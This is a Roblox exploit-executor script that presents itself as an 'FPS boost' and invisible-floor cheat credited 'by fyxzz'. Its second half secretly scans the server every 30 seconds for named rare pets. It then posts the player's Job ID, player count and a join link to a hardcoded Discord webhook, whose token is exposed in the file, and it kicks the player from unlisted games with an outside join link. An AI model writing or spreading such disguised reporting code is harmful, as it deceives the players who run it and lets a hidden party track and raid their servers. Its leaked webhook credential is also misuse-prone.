local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- Esperar personagem pronto
repeat wait() until player and player.Character and player.Character:FindFirstChild("HumanoidRootPart")
local character = player.Character
local humanoidRootPart = character.HumanoidRootPart

-- Esperar PlayerGui disponível
repeat wait() until player:FindFirstChild("PlayerGui")
local playerGui = player.PlayerGui

-- Variáveis
local floorPart = nil
local floorActive = false
local floorConnection = nil

-- === FPS BOOST ===
local function applyFPSBoost()
    local renderSettings = settings():GetService("RenderSettings")
    renderSettings.QualityLevel = Enum.QualityLevel.Level01

    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10

    Workspace.StreamingEnabled = true

    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Explosion") then
            obj:Destroy()
        elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        end
    end

    Workspace.DescendantAdded:Connect(function(obj)
        if obj:IsA("Explosion") then
            obj:Destroy()
        elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        end
    end)
end
applyFPSBoost()

-- === GUI ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MultiToolGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 150, 0, 170)
mainFrame.Position = UDim2.new(0, 20, 0.5, -85)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 10
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local function createUICorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius)
    corner.Parent = parent
end
createUICorner(mainFrame, 10)

local titleBar = Instance.new("TextLabel")
titleBar.Size = UDim2.new(1, 0, 0, 25)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
titleBar.BorderSizePixel = 0
titleBar.Text = "by fyxzz"
titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
titleBar.TextScaled = true
titleBar.Font = Enum.Font.GothamBold
titleBar.ZIndex = 11
titleBar.Parent = mainFrame
createUICorner(titleBar, 10)

local function createButton(text, posY, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, posY)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.BorderSizePixel = 0
    btn.ZIndex = 11
    btn.Parent = mainFrame
    createUICorner(btn, 8)
    return btn
end

local floorButton = createButton("Create Floor", 35, Color3.fromRGB(70,130,255))

-- === FUNÇÕES DE ATUALIZAÇÃO ===

local function getCurrentCharacter()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        character = player.Character
        humanoidRootPart = character.HumanoidRootPart
        return true
    end
    return false
end

-- Chão invisível
local function createFloor()
    if not getCurrentCharacter() then return end
    if floorPart then floorPart:Destroy() end

    floorPart = Instance.new("Part")
    floorPart.Name = "InvisibleFloor_" .. player.Name
    floorPart.Size = Vector3.new(10, 0.5, 10)
    floorPart.Material = Enum.Material.ForceField
    floorPart.Transparency = 0.3
    floorPart.BrickColor = BrickColor.new("Bright blue")
    floorPart.Anchored = true
    floorPart.CanCollide = true
    floorPart.TopSurface = Enum.SurfaceType.Smooth
    floorPart.BottomSurface = Enum.SurfaceType.Smooth
    floorPart.Parent = Workspace

    local pos = humanoidRootPart.Position
    floorPart.Position = Vector3.new(pos.X, pos.Y - 2.21, pos.Z)
end

local function removeFloor()
    if floorPart then floorPart:Destroy() floorPart = nil end
end

local function updateFloor()
    if floorPart and getCurrentCharacter() then
        local pos = humanoidRootPart.Position
        floorPart.Position = Vector3.new(pos.X, pos.Y - 2.25, pos.Z)
    end
end

local function toggleFloor()
    if not getCurrentCharacter() then return end

    if floorActive then
        removeFloor()
        floorActive = false
        if floorConnection then floorConnection:Disconnect() floorConnection = nil end
        floorButton.Text = "Create Floor"
        floorButton.BackgroundColor3 = Color3.fromRGB(70,130,255)
        print("Chão invisível desativado!")
    else
        createFloor()
        floorActive = true
        floorConnection = RunService.Heartbeat:Connect(updateFloor)
        floorButton.Text = "Delete Floor"
        floorButton.BackgroundColor3 = Color3.fromRGB(255,80,80)
        print("Chão invisível ativado!")
    end
end

-- === BOTÕES ===
floorButton.MouseButton1Click:Connect(toggleFloor)

-- Cleanup quando personagem mudar
player.CharacterAdded:Connect(function(char)
    character = char
    humanoidRootPart = nil
    repeat wait() until character:FindFirstChild("HumanoidRootPart")
    humanoidRootPart = character.HumanoidRootPart

    -- Reset floor
    removeFloor()
    floorActive = false
    floorButton.Text = "Create Floor"
    floorButton.BackgroundColor3 = Color3.fromRGB(70,130,255)
    if floorConnection then floorConnection:Disconnect() floorConnection = nil end
end)

-- CONFIG
getgenv().webhook = "https://discord.com/api/webhooks/1396606593910440006/JVSdrrPoIeRBtANwUiBKjdfFbDlekro0DPHyD3KL7VQ4fxl_FbK1WraiEt9yoereznBB"
getgenv().websiteEndpoint = nil

-- Allowed place IDs
local allowedPlaceIds = {
    [96342491571673] = true, -- New Players Server
    [109983668079237] = true -- Normal
}
getgenv().TargetPetNames = {
    "Graipuss Medussi",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Sammyni Spyderini",
    "Pot Hotspot",
    "Nuclearo Dinossauro",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Dragon Cannelloni",
    "Ballerino Lololo",
    "Chimpanzini Spiderini",
}

-- PRIVATE SERVER CHECK (works for VIP + Reserved)
local function isPrivateServer()
    return (game.PrivateServerId and game.PrivateServerId ~= "")
        or (game.VIPServerId and game.VIPServerId ~= "")
end

local function buildJoinLink(placeId, jobId)
    return string.format(
        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
        placeId,
        jobId
    )
end

-- KICK CHECK
if not allowedPlaceIds[game.PlaceId] then
    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
    player:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
    return
end

-- WEBHOOK SEND

local function sendWebhook(foundPets, jobId)
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local joinLink = buildJoinLink(game.PlaceId, jobId)

    local embedData = {
        username = "Private Webhook Notifier",
        embeds = { {
            title = "🐾 Pet(s) Found!",
            description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
            color = 65280,
            fields = {
                {
                    name = "Players",
                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
                    inline = true
                },
                {
                    name = "Job ID",
                    value = string.format("``%s``", jobId),
                    inline = true
                },
                {
                    name = "Join Link",
                    value = string.format("[Click to join server](%s)", joinLink),
                    inline = false
                }
            },
            footer = { text = "private webhook" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        local success, err = pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        if success then
            print("✅ Webhook sent")
        else
            warn("❌ Webhook failed:", err)
        end
    else
        warn("❌ No HTTP request function available")
    end
end

-- PET CHECK
local function checkForPets()
    local found = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in pairs(getgenv().TargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

-- MAIN LOOP
task.spawn(function()
    while true do
        local petsFound = checkForPets()
        if #petsFound > 0 then
            print("✅ Pets found:", table.concat(petsFound, ", "))
            sendWebhook(petsFound, game.JobId)
        else
            print("🔍 No pets found")
        end
        task.wait(30)
    end
end)
